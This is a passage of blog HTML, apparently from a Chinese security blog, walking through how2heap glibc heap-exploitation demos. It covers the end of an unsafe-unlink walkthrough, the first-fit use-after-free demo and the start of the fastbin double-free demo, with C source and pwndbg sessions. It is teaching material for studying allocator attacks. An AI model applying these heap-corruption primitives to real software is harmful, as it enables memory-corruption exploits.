class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>看到了吗,这里chunk1的prev_size已经被设为了0x80,这也就意味着系统向前找chunk的时候会向前0x80找到我们的fake_chunk</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x603090-0x80</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">27 = 0x603010</span><br></code></pre></td></tr></table></figure><p>但这并不够,我们需要伪造chunk1是free态的chunk,那么只需要把标志位设位0就好了,程序继续运行到下一断点</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">42 </span>  chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>这里是一个赋0的操作</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">0x91</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x602058</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x602060</span> &lt;stderr@@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>&gt;<br>&#125;<br><span class="hljs-number">0x603090</span> &#123;<br>  prev_size = <span class="hljs-number">0x80</span>,<br>  size = <span class="hljs-number">0x90</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603120</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134881</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>好了,万事具备,只欠东风:)</p><p>free chunk1,这时就会发生unlink(为什么请看文章开头unlink时机</p><p>这里就是触发了free的后向合并从而调用unlink函数,此时的堆结构</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">145</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x20ff1</span>,<br>  fd_nextsize = <span class="hljs-number">0x602058</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x602060</span> &lt;stderr@@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>&gt;<br>&#125;<br><span class="hljs-number">0x603090</span> &#123;<br>  prev_size = <span class="hljs-number">128</span>,<br>  size = <span class="hljs-number">144</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603120</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134881</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们现在给chunk0_ptr[3]赋值,将chunk0_ptr[3]指向victim_string的内存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x &amp;victim_string</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">40 = 0x7fffffffe640</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x chunk0_ptr</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">31 = 0x7fffffffe640</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x chunk0_ptr[3]</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">37 = 0x7ffff7a2d830</span><br></code></pre></td></tr></table></figure><p>这时我们可以发现,我们虽然修改的是chunk0_ptr[3],但其实修改的是chunk0_ptr的值</p><p>让程序继续跑,修改一下chunk0_ptr的值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p victim_string</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">63 = <span class="hljs-string">&quot;BBBBAAAA&quot;</span></span><br></code></pre></td></tr></table></figure><p>完美:)</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>依旧,程序先是弄了一个全局变量chunk0_ptr,紧接着给他申请了0x80实际上是0x90的内存空间</p><p>之后新建了一个大小一样的chunk1_ptr</p><p>这时我们要确定的是我们的全局指针是chunk0_ptr,要攻击的chunk是chunk1_ptr</p><p>之后程序构造了P-&gt;FD-&gt;BK&#x3D;P和P-&gt;BK-&gt;FD&#x3D;P的条件,想要伪造一个fake_chunk</p><p>假设我们拥有溢出的能力,修改chunk1_ptr的pre_size域让系统认为我们的上一个chunk是我们伪造的fake chunk,并且将chunk1_ptr的size域标志位置0以伪造其被free的假象</p><p>然后程序free掉了chunk1触发了free的后向合并从而调用了unlink函数,此时我们的攻击就算结束了</p><p>而程序的攻击效果就是将本来是P处的指针变为了P-0x18的指针,我们就拥有了任意内存读写的能力,over~</p><p>文章首发于安全客，转载请著名出处，文章链接<a href="https://www.anquanke.com/post/id/197481">https://www.anquanke.com/post/id/197481</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>how2heap总结计划一</title>
    <link href="/2020/01/18/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%B8%80/"/>
    <url>/2020/01/18/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<blockquote><p>how2heap系列几个与前更新了!!!!大事件,正好寒假时间充裕,不如把how2heap总结一遍算了,千万别咕咕咕了hhh</p></blockquote><p>PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 :)</p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>ctf-wiki.github.io<span class="hljs-regexp">/ctf-wiki/</span>pwn<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/liying_1234/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">52053183</span><br>https:<span class="hljs-regexp">//</span>code.woboq.org/<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shellphish/</span>how2heap<span class="hljs-regexp">/tree/m</span>aster/glibc_2.<span class="hljs-number">25</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2582</span><span class="hljs-comment">#toc-4</span><br></code></pre></td></tr></table></figure><h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><p>因为分为glibc2.25和glibc2.26,<br>因此我先起一个ubuntu16.04的docker</p><p><em>注:tcache,largebin,unsorted bin为先进后出,fastbin,smallbin为先进先出</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/shellphish/how2heap.git<br><span class="hljs-built_in">cd</span> how2heap<br>make<br></code></pre></td></tr></table></figure><p>对glibc的内存管理机制不熟的小伙伴,这里强烈推荐华庭师傅的glibc内存管理!!</p><p>虽然版本有些老,但是对理解glibc还是有极大的帮助的</p><h1 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01 first-fit"></a>0x01 first-fit</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>我们先看看源代码,这里我做了些处理,将一些作者的话删掉了:)</p><p>删掉的话的大概意思就是本文件不是攻击demo,而是对glibc一个选择chunk机制(first-fit)的一个说明,这个机制经常被用在uaf的利用中</p><p>所谓的first-fit就是首次适应算法,这里有一篇文章对常见内存分配算法有一个总结:<br><a href="https://blog.csdn.net/liying_1234/article/details/52053183">常见内存分配算法</a></p><p>好了,不影响,我们直接看源代码,加了一小点翻译</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-comment">//分配两个缓冲区,不一定是fastbin,可以比较大的</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);<br>        <span class="hljs-type">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x512</span>);<br>        <span class="hljs-type">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x256</span>);<br>        <span class="hljs-type">char</span>* c;<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1st malloc(0x512): %p\n&quot;</span>, a);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(0x256): %p\n&quot;</span>, b);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;we could continue mallocing here...\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);<br>        <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;this is A!&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(a);<br><br>        <span class="hljs-comment">//我们不用再释放其他的缓冲区了,只要我们分配的小于0x512,就可以从刚刚free的内存里取</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We don&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;</span>, a);<br><br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;So, let&#x27;s allocate 0x500 bytes\n&quot;</span>);<br>        c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd malloc(0x500): %p\n&quot;</span>, c);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);<br>        <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;this is C!&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="程序结果"><a href="#程序结果" class="headerlink" title="程序结果"></a>程序结果</h2><p>我们再运行一下程序</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs applescript">This <span class="hljs-built_in">file</span> doesn&#x27;t demonstrate an attack, <span class="hljs-keyword">but</span> shows <span class="hljs-keyword">the</span> nature <span class="hljs-keyword">of</span> glibc&#x27;s allocator.<br>glibc uses a <span class="hljs-keyword">first</span>-fit algorithm <span class="hljs-keyword">to</span> select a free chunk.<br>If a chunk <span class="hljs-keyword">is</span> free <span class="hljs-keyword">and</span> large enough, malloc will select this chunk.<br>This can be exploited <span class="hljs-keyword">in</span> a use-<span class="hljs-keyword">after</span>-free situation.<br>Allocating <span class="hljs-number">2</span> buffers. They can be large, don&#x27;t have <span class="hljs-keyword">to</span> be fastbin.<br><span class="hljs-number">1</span>st malloc(<span class="hljs-number">0x512</span>): <span class="hljs-number">0x1e03010</span><br><span class="hljs-number">2</span>nd malloc(<span class="hljs-number">0x256</span>): <span class="hljs-number">0x1e03530</span><br>we could <span class="hljs-keyword">continue</span> mallocing here...<br>now let&#x27;s <span class="hljs-keyword">put</span> a <span class="hljs-built_in">string</span> <span class="hljs-keyword">at</span> a <span class="hljs-keyword">that</span> we can <span class="hljs-built_in">read</span> later <span class="hljs-string">&quot;this is A!&quot;</span><br><span class="hljs-keyword">first</span> allocation <span class="hljs-number">0x1e03010</span> points <span class="hljs-keyword">to</span> this <span class="hljs-keyword">is</span> A!<br>Freeing <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> one...<br>We don&#x27;t need <span class="hljs-keyword">to</span> free anything again. As long <span class="hljs-keyword">as</span> we allocate smaller than <span class="hljs-number">0x512</span>, <span class="hljs-keyword">it</span> will <span class="hljs-keyword">end</span> up <span class="hljs-keyword">at</span> <span class="hljs-number">0x1e03010</span><br>So, let&#x27;s allocate <span class="hljs-number">0x500</span> bytes<br><span class="hljs-number">3</span>rd malloc(<span class="hljs-number">0x500</span>): <span class="hljs-number">0x1e03010</span><br>And <span class="hljs-keyword">put</span> a different <span class="hljs-built_in">string</span> here, <span class="hljs-string">&quot;this is C!&quot;</span><br><span class="hljs-number">3</span>rd allocation <span class="hljs-number">0x1e03010</span> points <span class="hljs-keyword">to</span> this <span class="hljs-keyword">is</span> C!<br><span class="hljs-keyword">first</span> allocation <span class="hljs-number">0x1e03010</span> points <span class="hljs-keyword">to</span> this <span class="hljs-keyword">is</span> C!<br>If we reuse <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> allocation, <span class="hljs-keyword">it</span> now holds <span class="hljs-keyword">the</span> data <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">third</span> allocation.<br></code></pre></td></tr></table></figure><h2 id="关键部分调试"><a href="#关键部分调试" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><p>因为内容比较简单,这里就做一个写入内容的对比吧</p><ol><li>首先在写c之前下一个断点</li></ol><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span><br><span class="hljs-number">31</span>              fprintf(stderr, <span class="hljs-string">&quot;3rd malloc(0x500): %p<span class="hljs-char escape_">\n</span>&quot;</span>, c);<br><span class="hljs-number">32</span>              fprintf(stderr, <span class="hljs-string">&quot;And put a different string here, <span class="hljs-char escape_">\&quot;</span>this is C!<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\n</span>&quot;</span>);<br><span class="hljs-number">33</span>              strcpy(c, <span class="hljs-string">&quot;this is C!&quot;</span>);<br><span class="hljs-number">34</span>              fprintf(stderr, <span class="hljs-string">&quot;3rd allocation %p points to %s<span class="hljs-char escape_">\n</span>&quot;</span>, c, c);<br><span class="hljs-number">35</span>              fprintf(stderr, <span class="hljs-string">&quot;first allocation %p points to %s<span class="hljs-char escape_">\n</span>&quot;</span>, a, a);<br><span class="hljs-number">36</span>              fprintf(stderr, <span class="hljs-string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.<span class="hljs-char escape_">\n</span>&quot;</span>);<br><span class="hljs-number">37</span>      &#125;<br>pwndbg<span class="hljs-operator">&gt;</span> b <span class="hljs-number">32</span><br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0</span><span class="hljs-params">x400842:</span> file first_fit.c, line <span class="hljs-number">32</span>.<br></code></pre></td></tr></table></figure><ol start="2"><li>运行一下康康<br>程序停在了第32行</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>st malloc(<span class="hljs-number">0x512</span>): <span class="hljs-number">0x603010</span><br><span class="hljs-number">2</span>nd malloc(<span class="hljs-number">0x256</span>): <span class="hljs-number">0x603530</span><br>we could <span class="hljs-keyword">continue</span> mallocing here...<br>now let&#x27;s <span class="hljs-keyword">put</span> a <span class="hljs-built_in">string</span> <span class="hljs-keyword">at</span> a <span class="hljs-keyword">that</span> we can <span class="hljs-built_in">read</span> later <span class="hljs-string">&quot;this is A!&quot;</span><br><span class="hljs-keyword">first</span> allocation <span class="hljs-number">0x603010</span> points <span class="hljs-keyword">to</span> this <span class="hljs-keyword">is</span> A!<br>Freeing <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> one...<br>We don&#x27;t need <span class="hljs-keyword">to</span> free anything again. As long <span class="hljs-keyword">as</span> we allocate smaller than <span class="hljs-number">0x512</span>, <span class="hljs-keyword">it</span> will <span class="hljs-keyword">end</span> up <span class="hljs-keyword">at</span> <span class="hljs-number">0x603010</span><br>So, let&#x27;s allocate <span class="hljs-number">0x500</span> bytes<br><span class="hljs-number">3</span>rd malloc(<span class="hljs-number">0x500</span>): <span class="hljs-number">0x603010</span><br></code></pre></td></tr></table></figure><p>那我们先看看a的内容吧</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">pwndbg&gt; p a<br>$<span class="hljs-number">17</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x603010</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\25</span>0<span class="hljs-char escape_">\03</span>7<span class="hljs-char escape_">\33</span>5<span class="hljs-char escape_">\36</span>7<span class="hljs-char escape_">\37</span>7<span class="hljs-char escape_">\17</span>7&quot;</span><br></code></pre></td></tr></table></figure><p>然后再看下c的内容</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">pwndbg&gt; p <span class="hljs-keyword">c</span><br>$<span class="hljs-number">18</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x603010</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\25</span>0<span class="hljs-char escape_">\03</span>7<span class="hljs-char escape_">\33</span>5<span class="hljs-char escape_">\36</span>7<span class="hljs-char escape_">\37</span>7<span class="hljs-char escape_">\17</span>7&quot;</span><br></code></pre></td></tr></table></figure><p>可以看到此时a,c位于同一内存空间</p><p>现在两个单步直接给c赋值为”this is c”<br>此时康康a和c的内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p a</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">19 = 0x603010 <span class="hljs-string">&quot;this is C!&quot;</span></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p c</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">20 = 0x603010 <span class="hljs-string">&quot;this is C!&quot;</span></span><br></code></pre></td></tr></table></figure><p>更改c时成功更改了a的内容</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以看到程序先分配了两个chunk块a(0x512),b(0x256)</p><p>然后给a赋值为”this is A”,释放a,之后分配c(0x500)</p><p>然后给C赋值为”this is C”,此时输出a,c的地址和内容</p><p>发现a块和c块内存地址相同,但a的内容改为了C,程序成功通过修改c来修改来a块</p><p>而这也可以通过修改a块来修改c块的内容,而这也是一个uaf漏洞(free后并未置0) :)</p><p>first-fit的内容比较简单,这里也不再多讲,进入下一个</p><h1 id="0x02-fastbin-dup"><a href="#0x02-fastbin-dup" class="headerlink" title="0x02 fastbin_dup"></a>0x02 fastbin_dup</h1><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><p>还是先看源代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-comment">//一个基于fasstbin的简单的double-free利用</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br>        <span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>        <span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>        <span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(a);<br>        <span class="hljs-comment">//如果再free一次a,程序就会crash,因为a是free链上的最顶的chunk</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br>        <span class="hljs-comment">// free(a);</span><br>        <span class="hljs-comment">//因此我们free b</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br>        <span class="hljs-built_in">free</span>(b);<br>        <span class="hljs-comment">//现在再free一次a</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br>        <span class="hljs-built_in">free</span>(a);<br>        <span class="hljs-comment">//现在我们的free链变成了 a-&gt;b-&gt;a</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>运行一下康康</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs llvm">This file demonstrates a simple <span class="hljs-type">double</span>-<span class="hljs-keyword">free</span> attack with fastbins.<br>Allocating <span class="hljs-number">3</span> buffers.<br><span class="hljs-number">1</span>st <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07010</span><br><span class="hljs-number">2</span>nd <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07030</span><br><span class="hljs-number">3</span>rd <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07050</span><br>Freeing the first <span 